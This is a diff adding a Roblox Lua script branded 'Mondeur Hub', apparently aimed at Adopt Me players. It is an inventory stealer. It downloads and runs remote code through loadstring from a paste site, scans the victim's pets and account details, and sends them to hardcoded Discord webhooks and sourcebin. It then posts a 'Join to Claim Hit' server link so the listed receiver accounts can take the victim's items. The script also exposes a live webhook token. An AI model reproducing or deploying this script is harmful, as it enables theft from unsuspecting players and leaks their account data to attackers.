@@ -1,0 +1,164 @@
+-- [[ MONDEUR HUB | WEBHOOK & DUALHOOK MASTER ]] --
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+getgenv().DUALHOOK_URL = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+getgenv().TARGETS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
+getgenv().VAL_LIMIT = 500
+
+if _G.__MondeurV7Running then return end
+_G.__MondeurV7Running = true
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- [[ 1. ELYSIUM LOADING SCREEN ]] --
+task.spawn(function()
+    pcall(function() 
+        loadstring(game:HttpGet("https://pastefy.app/YXprt2gr/raw"))() 
+    end)
+end)
+
+-- Wait for game to finish loading
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+-- [[ 2. SOURCEBIN LOGGING ]] --
+local function uploadLog(pets)
+    local req = (syn and syn.request) or (http and http.request) or http_request or request
+    if not req then return nil end
+
+    local logContent = "=== MONDEUR HUB FULL INVENTORY LOG ===\n"
+    logContent = logContent .. "Player: " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")\n"
+    logContent = logContent .. "Account Age: " .. LocalPlayer.AccountAge .. " days\n"
+    logContent = logContent .. "-------------------------------------------\n\n"
+
+    for i, p in ipairs(pets) do
+        local tag = (p.isMega and "[MEGA] ") or (p.isNeon and "[NEON] ") or ""
+        logContent = logContent .. string.format("[%d] %s%s | Value: %d\n", i, tag, p.name, p.value)
+    end
+
+    local ok, res = pcall(function()
+        return req({
+            Url = "https://sourceb.in/api/bins",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({ files = {{content = logContent}} })
+        })
+    end)
+    if ok and res and res.StatusCode == 200 then
+        local data = HttpService:JSONDecode(res.Body)
+        if data and data.key then return "https://srcb.in/" .. data.key end
+    end
+    return "https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw" -- Fallback placeholder
+end
+
+-- [[ 3. WEBHOOK DESIGN (V7 LAYOUT) ]] --
+local function sendReport(url, title, color, pets, val, count, receiver)
+    local req = (syn and syn.request) or (http and http.request) or http_request or request
+    if not req then return end
+
+    local binLink = uploadLog(pets)
+    local lootLines = {}
+    for i, p in ipairs(pets) do
+        if i > 20 then break end 
+        local tag = (p.isMega and "🌈 ") or (p.isNeon and "✨ ") or "🐾 "
+        table.insert(lootLines, tag .. p.name .. " — `" .. p.value .. "`")
+    end
+
+    local payload = HttpService:JSONEncode({
+        username = "Mondeur Hub (Best)",
+        embeds = {{
+            title = title,
+            color = color,
+            description = "### 📄 Player Information\n" ..
+                "👤 **User Name** : `" .. LocalPlayer.Name .. "`\n" ..
+                "🎭 **Display Name** : `" .. LocalPlayer.DisplayName .. "`\n" ..
+                "📅 **Account Age** : " .. LocalPlayer.AccountAge .. " days\n" ..
+                "📱 **Executor** : " .. (identifyexecutor and identifyexecutor() or "Delta") .. "\n" ..
+                "👥 **Players** : " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. "\n" ..
+                "😎 **Receiver** : " .. (receiver or "None Online") .. "\n" ..
+                "💰 **Total Value** : `" .. val .. "`\n\n" ..
+                "### 📡 Player Status\n" ..
+                "🟢 **Connected & Intercepting**\n\n" ..
+                "### 📦 Loot Summary\n" ..
+                "```\n" .. (table.concat(lootLines, "\n") or "No items found") .. "\n```\n" ..
+                "**Total Items Found:** `" .. count .. "`\n\n" ..
+                "### 🔍 Links\n" ..
+                "[**View Full Inventory Log**](" .. (binLink or "#") .. ")\n" ..
+                "### 👥 Join Player\n" ..
+                "[**Join to Claim Hit!**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")",
+            footer = { text = "Mondeur Elite Services | " .. os.date("%X") },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    })
+
+    pcall(function()
+        req({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end)
+end
+
+-- [[ 4. CORE EXECUTION ]] --
+task.spawn(function()
+    print("Mondeur: Fetching modules...")
+    local Fsys = ReplicatedStorage:WaitForChild("Fsys", 120)
+    local Fsys2 = require(Fsys)
+    local DB = Fsys2.load("InventoryDB")
+    local InvAPI = ReplicatedStorage.API:WaitForChild("InventoryAPI/GetInventory", 120)
+
+    local inventory = nil
+    -- Persistent Scan (tries for 1 minute)
+    for i = 1, 20 do
+        print("Mondeur: Scan attempt " .. i)
+        local ok, res = pcall(function() return InvAPI:InvokeServer() end)
+        if ok and res then inventory = res break end
+        task.wait(3)
+    end
+
+    if not inventory then 
+        warn("Mondeur: CRITICAL - Could not reach inventory.") 
+        return 
+    end
+
+    local allPets, dualPets = {}, {}
+    local totalVal, dualVal = 0, 0
+
+    for id, item in pairs(inventory) do
+        if item.Kind == "Pet" then
+            local data = DB.pets[item.id]
+            local val = (item.properties and item.properties.value) or 0
+            local petObj = {
+                name = (data and data.name) or item.id,
+                value = val,
+                isNeon = item.properties and item.properties.neon,
+                isMega = item.properties and item.properties.mega_neon
+            }
+            table.insert(allPets, petObj)
+            totalVal = totalVal + val
+            if val >= getgenv().VAL_LIMIT then
+                table.insert(dualPets, petObj)
+                dualVal = dualVal + val
+            end
+        end
+    end
+    table.sort(allPets, function(a, b) return a.value > b.value end)
+    table.sort(dualPets, function(a, b) return a.value > b.value end)
+
+    local targetName = "None Online"
+    for _, name in ipairs(getgenv().TARGETS) do
+        if Players:FindFirstChild(name) then targetName = name break end
+    end
+
+    -- Send Webhooks
+    sendReport(getgenv().WEBHOOK_URL, "MondeurOnTop • Main Hit [ 🌊 ]", 0x3498db, allPets, totalVal, #allPets, targetName)
+    
+    if #dualPets > 0 then
+        task.wait(2)
+        sendReport(getgenv().DUALHOOK_URL, "MondeurOnTop • Dualhook Hit [ 💎 ]", 0x9b59b6, dualPets, dualVal, #dualPets, targetName)
+    end
+    print("Mondeur: Process Complete.")
+end)
